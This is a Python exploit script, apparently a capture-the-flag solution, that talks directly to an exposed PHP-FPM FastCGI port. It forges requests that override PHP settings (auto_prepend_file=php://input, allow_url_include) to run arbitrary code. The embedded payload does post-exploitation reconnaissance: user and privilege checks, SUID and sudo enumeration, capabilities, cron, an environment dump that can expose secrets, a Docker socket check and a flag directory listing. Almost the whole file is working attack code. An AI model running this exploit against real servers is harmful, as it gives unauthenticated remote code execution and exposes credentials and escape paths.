#!/usr/bin/env python3
"""FastCGI RCE for PHP-FPM - creates temp file and executes it"""
import socket

TARGET = ('10.0.174.210', 9000)

def build_fcgi_request(params_list, stdin_body=b''):
    """Build raw FastCGI request"""
    # FCGI_BEGIN_REQUEST
    begin = b'\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    
    # Build params
    params_raw = b''
    for k, v in params_list:
        kb = k.encode()
        vb = v.encode()
        for b_arr in [kb, vb]:
            l = len(b_arr)
            if l < 128:
                params_raw += bytes([l])
            else:
                params_raw += bytes([(l >> 24) | 0x80, (l >> 16) & 0xff, (l >> 8) & 0xff, l & 0xff])
        params_raw += kb + vb
    
    pl = len(params_raw)
    params_rec = b'\x01\x04\x00\x01' + bytes([(pl >> 8) & 0xff, pl & 0xff]) + b'\x00\x00' + params_raw
    empty_p = b'\x01\x04\x00\x01\x00\x00\x00\x00'
    
    sl = len(stdin_body)
    stdin_rec = b'\x01\x05\x00\x01' + bytes([(sl >> 8) & 0xff, sl & 0xff]) + b'\x00\x00' + stdin_body
    empty_s = b'\x01\x05\x00\x01\x00\x00\x00\x00'
    
    return begin + params_rec + empty_p + stdin_rec + empty_s

def fcgi_exec(php_code, script='/var/www/html/index.php', extra_params=None):
    """Execute PHP code via FastCGI"""
    params = [
        ('SCRIPT_FILENAME', script),
        ('SCRIPT_NAME', script),
        ('REQUEST_URI', script),
        ('DOCUMENT_URI', script),
        ('DOCUMENT_ROOT', '/var/www/html'),
        ('SERVER_NAME', 'cloudfunc'),
        ('SERVER_PORT', '80'),
        ('REMOTE_ADDR', '127.0.0.1'),
        ('REQUEST_METHOD', 'POST'),
        ('CONTENT_TYPE', 'application/x-www-form-urlencoded'),
        ('QUERY_STRING', ''),
        ('PHP_VALUE', 'auto_prepend_file = php://input'),
        ('PHP_ADMIN_VALUE', 'open_basedir = /'),
        ('PHP_ADMIN_VALUE', 'allow_url_include = On'),
        ('PHP_ADMIN_VALUE', 'display_errors = On'),
        ('PHP_ADMIN_VALUE', 'error_reporting = E_ALL'),
    ]
    if extra_params:
        params.extend(extra_params)
    
    payload = build_fcgi_request(params, php_code.encode())
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect(TARGET)
    sock.send(payload)
    
    resp = b''
    while True:
        try:
            d = sock.recv(4096)
            if not d: break
            resp += d
        except: break
    sock.close()
    
    # Parse FCGI response
    pos = 0
    stdout = b''
    stderr = b''
    while pos + 7 < len(resp):
        rec_type = resp[pos+1]
        content_len = (resp[pos+4] << 8) | resp[pos+5]
        padding_len = resp[pos+6]
        pos += 8
        if pos + content_len > len(resp): break
        body = resp[pos:pos+content_len]
        pos += content_len + padding_len
        if rec_type == 6:  # STDOUT
            stdout += body
        elif rec_type == 7:  # STDERR
            stderr += body
    return stdout, stderr

if __name__ == '__main__':
    # Execute comprehensive system exploration
    php = r"""echo "<PRE>\n";
echo "=== WHOAMI ===\n"; system("whoami");
echo "\n=== ID ===\n"; system("id");
echo "\n=== FLAG ===\n"; system("ls -la /challenge/");
echo "\n=== CAPABILITIES ===\n"; system("cat /proc/1/status 2>/dev/null | grep -i cap");
echo "\n=== CGROUP ===\n"; system("cat /proc/1/cgroup 2>/dev/null | head -5");
echo "\n=== DOCKER ===\n"; system("[ -f /.dockerenv ] && echo 'In Docker' || echo 'Not in Docker'");
echo "\n=== KERNEL ===\n"; system("uname -a");
echo "\n=== SUID ===\n"; system("find / -perm -4000 -type f 2>/dev/null | head -20");
echo "\n=== SUDO ===\n"; system("sudo -l 2>/dev/null || echo 'no sudo'");
echo "\n=== CAPSH ===\n"; system("capsh --print 2>/dev/null || getcap -r / 2>/dev/null || echo 'no cap tools'");
echo "\n=== MOUNT ===\n"; system("mount 2>/dev/null | head -10");
echo "\n=== CRONTAB ===\n"; system("cat /etc/crontab 2>/dev/null; ls /etc/cron* 2>/dev/null");
echo "\n=== NETSTAT ===\n"; system("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null");
echo "\n=== PHP-FPM ===\n"; system("ps aux 2>/dev/null | grep -E 'php|fpm|nginx'");
echo "\n=== WWW FILES ===\n"; system("find /var/www -type f -name '*.php' 2>/dev/null");
echo "\n=== SERVERLESS ===\n"; system("find / -type f -name '*serverless*' -o -name '*function*' -o -name '*cloudfunc*' -o -name '*runtime*' 2>/dev/null | head -30");
echo "\n=== HOME ===\n"; system("ls -la /home/ 2>/dev/null; ls -la /root/ 2>/dev/null");
echo "\n=== ENV ===\n"; system("env 2>/dev/null");
echo "\n=== SYSCTL ===\n"; system("cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null; cat /proc/sys/kernel/core_pattern 2>/dev/null");
echo "\n=== DEVICES ===\n"; system("ls -la /dev/sd* /dev/xvd* /dev/vd* /dev/nvme* 2>/dev/null");
echo "\n=== DOCKER SOCK ===\n"; system("ls -la /var/run/docker.sock 2>/dev/null || echo 'no docker sock'");
echo "\n</PRE>";"""
    
    stdout, stderr = fcgi_exec(php)
    print(stdout.decode('utf-8', errors='replace'))
    if stderr:
        print("=== STDERR ===")
        print(stderr.decode('utf-8', errors='replace'))
